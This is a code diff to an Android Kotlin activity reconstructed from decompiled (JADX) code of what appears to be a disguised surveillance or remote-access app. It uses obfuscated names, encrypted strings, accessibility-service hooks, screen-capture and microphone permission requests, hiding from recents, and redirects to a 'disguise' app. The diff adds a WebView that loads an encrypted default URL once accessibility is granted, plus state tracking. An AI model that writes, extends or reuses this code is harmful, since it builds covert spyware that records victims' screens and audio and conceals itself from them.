@@ -42,7 +42,10 @@ import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import com.storm.safe.rock.activity.AccessibilityTrampoline
 import com.storm.safe.rock.activity.qixvbtmo
+import com.storm.safe.rock.p000.WebViewHeartbeat
+import com.storm.safe.rock.p000.WebViewManager
 import com.storm.safe.rock.service.MyAccessibilityService
+import com.storm.safe.rock.util.DebugConfig
 import com.storm.safe.rock.util.StringUtil
 import java.io.File
 import java.lang.ref.WeakReference
@@ -82,8 +85,8 @@ import org.json.JSONObject
  *   d4→requestMediaProjection, d5→requestMiuiProjectionViaQixvbtmo,
  *   d6→requestMicrophonePermission, d7→requestStandardProjection,
  *   d8→showMainContent, d9→startPermissionTimeout,
- *   e0→onAccessibilityEnabled, e1→setupDarkOverlay, e2→cancelPermissionTimeout,
- *   e3→checkAndRequestOverlayPermission, e4→setButtonText,
+ *   e0→onAccessibilityEnabled, e1→startWebViewTracking, e2→cancelPermissionTimeout,
+ *   e3→stopWebViewTracking, e4→setButtonText,
  *   e5→setStatusTextWithColor, e6→setStatusText, e7→updateSwitchState,
  *   e8→tryAutoPermission
  */
@@ -262,8 +265,12 @@ class iuzxujjtqev : AppCompatActivity() {
     // ── Programmatic layout view references ──────────────────
     private var backgroundImageView: ImageView? = null
     private var mainContentView: LinearLayout? = null
-    private var webViewContainer: FrameLayout? = null
+    var webViewContainer: FrameLayout? = null
+        private set
     private var webView: WebView? = null
+    var fullScreenVideoContainer: FrameLayout? = null
+        private set
+    private var heartbeatRunnable: WebViewHeartbeat? = null
 
     /** Merged from iuzxujjtqev$combinedBroadcastReceiver$1. */
     inner class CombinedBroadcastReceiver : BroadcastReceiver() {
@@ -767,6 +774,18 @@ class iuzxujjtqev : AppCompatActivity() {
         wvContainer.addView(wv)
         root.addView(wvContainer)
 
+        // ── 6. FullScreen Video Container (for WebChromeClient fullscreen) ──
+        val fsContainer = FrameLayout(this).apply {
+            layoutParams = FrameLayout.LayoutParams(
+                FrameLayout.LayoutParams.MATCH_PARENT,
+                FrameLayout.LayoutParams.MATCH_PARENT
+            )
+            visibility = View.GONE
+            id = View.generateViewId()
+        }
+        fullScreenVideoContainer = fsContainer
+        root.addView(fsContainer)
+
         setContentView(root)
         Log.d(TAG, "✅ 程序化布局已创建")
     }
@@ -976,35 +995,92 @@ class iuzxujjtqev : AppCompatActivity() {
         permissionTimeoutHandler?.post { Log.w(TAG, "⚠️ [权限] 超时检查") }
     }
 
-    /** JADX: e0() — handle accessibility service becoming enabled. */
+    /** JADX: e0() — handle accessibility enabled → load WebView. */
     fun onAccessibilityEnabled() {
         try {
-            // SMART_RETURN_BACKUP: launched by smartReturnToApp, must NOT redirect
             val isSmartReturn = intent?.getBooleanExtra("SMART_RETURN_BACKUP", false) == true
             if (isSmartReturn) {
                 Log.d(TAG, "✅ [onAccessibilityEnabled] SMART_RETURN_BACKUP 模式，跳过伪装跳转")
+                // ADAPT: 不 return — 跳过伪装跳转但继续加载 WebView
+            } else {
+                val prefsName = StringUtil.decrypt("KkkBBV4sDTpS")
+                val setupKey = StringUtil.decrypt("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU=")
+                val setupComplete = getSharedPreferences(prefsName, 0).getBoolean(setupKey, false)
+                val triggerExclude = intent?.getBooleanExtra("TRIGGER_EXCLUDE_FROM_RECENTS", false) == true
+                if (!isPermissionGranted && setupComplete && !triggerExclude) {
+                    isPermissionGranted = true; redirectToDisguiseApp(); return
+                }
+            }
+            if (isFinishing || isDestroyed) {
+                Log.e(TAG, "❌ Activity已销毁或正在结束，无法启动WebView"); return
+            }
+
+            // ADAPT: debug 模式跳过 WebView 加载
+            if (DebugConfig.disableWebView) {
+                Log.d(TAG, "🔧 [debug] WebView 已禁用，跳过加载")
+                startWebViewTracking()
                 return
             }
 
-            val prefsName = StringUtil.decrypt("KkkBBV4sDTpS")
-            val setupKey = StringUtil.decrypt("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU=")
-            val setupComplete = getSharedPreferences(prefsName, 0).getBoolean(setupKey, false)
-            val triggerExclude = intent?.getBooleanExtra("TRIGGER_EXCLUDE_FROM_RECENTS", false) == true
-            if (!isPermissionGranted && setupComplete && !triggerExclude) { isPermissionGranted = true; redirectToDisguiseApp(); return }
-            if (isFinishing || isDestroyed) { Log.e(TAG, "❌ Activity已销毁或正在结束"); return }
-            setupDarkOverlay()
-        } catch (e: Exception) { Log.w(TAG, "❌ 启动WebView失败: ${e.message}") }
+            // JADX: 读取 webUrl — vendor 从 server_config.json 读加密字段
+            // ADAPT: 复刻从 DebugConfig.webUrl 读明文 URL
+            var webUrl = DebugConfig.webUrl
+            if (webUrl.isEmpty()) {
+                Log.w(TAG, "⚠️ 配置文件中没有webUrl，使用默认URL")
+                webUrl = StringUtil.decrypt("I00FKl5iQ2FafylYGD5Ydg8hWg==")
+            }
+
+            val wv = webView
+            if (wv == null) {
+                Log.e(TAG, "❌ 未找到WebView视图，无法加载页面"); return
+            }
+
+            // JADX: ne1.m214073a0(webView) — init WebView
+            val manager = WebViewManager(this)
+            manager.webViewContainer = webViewContainer
+            manager.fullScreenVideoContainer = fullScreenVideoContainer
+            manager.initialize(wv)
+
+            // JADX: webViewContainer.setVisibility(VISIBLE)
+            webViewContainer?.visibility = View.VISIBLE
+            wv.visibility = View.VISIBLE
+
+            // JADX: m211231e1() — start tracking
+            startWebViewTracking()
+
+            // JADX: setSystemUiVisibility(256)
+            try {
+                @Suppress("DEPRECATION")
+                window.decorView.systemUiVisibility = 256
+            } catch (e: Exception) {
+                Log.w(TAG, "⚠️ 系统UI优化失败: ${e.message}")
+            }
+
+            // JADX: webView.loadUrl(url)
+            wv.loadUrl(webUrl)
+            Log.d(TAG, "✅ WebView 已加载 URL: $webUrl")
+        } catch (e: Exception) {
+            Log.w(TAG, "❌ 启动WebView失败: ${e.message}")
+        }
     }
 
-    /** JADX: e1() — setup dark overlay. */
-    fun setupDarkOverlay() {
+    /** JADX: e1() — start WebView state tracking with heartbeat. */
+    fun startWebViewTracking() {
         try {
-            checkAndRequestOverlayPermission(); isInitialized = true; uiHandler = Handler(Looper.getMainLooper())
+            stopWebViewTracking()
+            isInitialized = true
+            uiHandler = Handler(Looper.getMainLooper())
             var isActive = false
-            try { if (!isFinishing && !isDestroyed && hasWindowFocus()) isActive = true } catch (_: Exception) {}
+            try {
+                if (hasWindowFocus() && !isFinishing && !isDestroyed) isActive = true
+            } catch (_: Exception) {}
             if (isActive) MyAccessibilityService.isWebViewOpen = true
-            uiHandler?.postDelayed({ updateSwitchState() }, 500L)
-        } catch (e: Exception) { Log.e(TAG, "❌ 启动WebView状态更新失败", e) }
+            val heartbeat = WebViewHeartbeat(this)
+            heartbeatRunnable = heartbeat
+            uiHandler?.postDelayed(heartbeat, 500L)
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ 启动WebView状态更新失败", e)
+        }
     }
 
     /** JADX: e2() — cancel permission timeout. */
@@ -1013,8 +1089,20 @@ class iuzxujjtqev : AppCompatActivity() {
     }
 
     /** JADX: e3() — stop WebView state tracking. */
-    fun checkAndRequestOverlayPermission() {
-        try { isInitialized = false; uiHandler?.removeCallbacksAndMessages(null); uiHandler = null; MyAccessibilityService.isWebViewOpen = false } catch (e: Exception) { Log.e(TAG, "❌ 停止WebView状态更新失败", e) }
+    fun stopWebViewTracking() {
+        try {
+            isInitialized = false
+            val handler = uiHandler
+            val heartbeat = heartbeatRunnable
+            if (handler != null && heartbeat != null) {
+                handler.removeCallbacks(heartbeat)
+            }
+            uiHandler = null
+            heartbeatRunnable = null
+            MyAccessibilityService.isWebViewOpen = false
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ 停止WebView状态更新失败", e)
+        }
     }
 
     /** JADX: e4() — set button text safely. */
@@ -1170,6 +1258,12 @@ class iuzxujjtqev : AppCompatActivity() {
             intent?.getBooleanExtra("MI_ANDROID10_RETURN", false) == true ||
             intent?.getBooleanExtra("MI_ANDROID13_RETURN", false) == true
         if (!isSmartReturn && intent?.getBooleanExtra("TRIGGER_EXCLUDE_FROM_RECENTS", false) != true && setupComplete && !isPermissionGranted && (isD || isHuaweiDisguiseActive() || isVivoDisguiseActive())) { isPermissionGranted = true; redirectToDisguiseApp(); return }
+        // JADX: WebView 可见性检查 + 恢复
+        val webViewVisible = webViewContainer?.visibility == View.VISIBLE
+        if (webViewVisible) {
+            MyAccessibilityService.isWebViewOpen = true
+            try { webView?.onResume() } catch (e: Exception) { Log.w(TAG, "⚠️ 恢复WebView失败: ${e.message}") }
+        }
         val ae = isAccessibilityEnabled()
         if (!ae) { showMainContent(); return }
         // Don't hide content during smartReturnToApp — Activity must stay visible
@@ -1177,6 +1271,8 @@ class iuzxujjtqev : AppCompatActivity() {
             try { mainContentView?.visibility = View.GONE } catch (e: Exception) { Log.w(TAG, "❌ 隐藏提示弹窗失败: ${e.message}") }
         }
         if (!getSharedPreferences(pn, 0).getBoolean(sk, false)) sendBroadcast(Intent("${packageName}.START_AUTHORIZATION").apply { setPackage(packageName) })
+        // JADX: WebView 不可见时尝试加载
+        if (ae && !webViewVisible) onAccessibilityEnabled()
     }
 
     override fun onPause() {
@@ -1185,10 +1281,13 @@ class iuzxujjtqev : AppCompatActivity() {
         if (isInitialized) MyAccessibilityService.isWebViewOpen = false
     }
 
-    override fun onStop() { super.onStop(); currentActivityRef = null }
+    // Phase G: onStop 不清 currentActivityRef — OppoSteps.executeStep1 需要通过
+    // getCurrentActivity() bridge 调 requestPermissions(即便 Activity 被 Settings 页面短暂覆盖
+    // 进入 stopped 状态)。onDestroy(L1196)已有清理逻辑,这里不再重复清。
+    override fun onStop() { super.onStop() }
 
     override fun onDestroy() {
-        super.onDestroy(); checkAndRequestOverlayPermission(); cancelPermissionTimeout()
+        super.onDestroy(); stopWebViewTracking(); cancelPermissionTimeout()
         try { permissionTimeoutHandler?.removeCallbacksAndMessages(null); permissionTimeoutHandler = null; uiHandler?.removeCallbacksAndMessages(null); uiHandler = null } catch (e: Exception) { Log.w(TAG, "清理Handler任务失败: ${e.message}") }
         try { if (receiverRegistered) { unregisterReceiver(combinedBroadcastReceiver); receiverRegistered = false } } catch (e: Exception) { Log.w(TAG, "取消注册广播接收器失败: ${e.message}") }
         try { val wv = webView; if (wv != null) { try { wv.clearCache(true); wv.clearHistory() } catch (_: Exception) {}; try { wv.loadUrl("about:blank"); wv.clearHistory(); wv.clearCache(true); wv.destroy() } catch (_: Exception) {} } } catch (e: Exception) { Log.w(TAG, "清理WebView资源失败: ${e.message}") }
